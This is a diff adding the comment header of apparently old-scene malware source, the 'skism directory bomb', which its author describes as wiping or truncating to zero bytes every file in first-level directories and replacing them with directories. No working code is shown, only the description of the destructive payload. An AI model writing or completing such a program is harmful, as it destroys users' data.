@@ -1,0 +1,17 @@
+;skism directory bomb v1.00
+
+;written by hellraiser
+
+;this is a lame bomb consisting of repetative/error full code
+;but it gets the job done
+;when run this program will start at the first directory from the root
+;and trash all files in first level directorys
+;then create a directory in place of the distroyed file name
+
+;it will also create a semi-removable directory called skism
+
+;yes bombs are very lame, and be advised, this is the only bomb
+;skism shall ever write... but we must try everything once
+
+;be warned, the tech used by this program does not only erase files but
+;it will also truncate them to 0 bytes, the skism method.
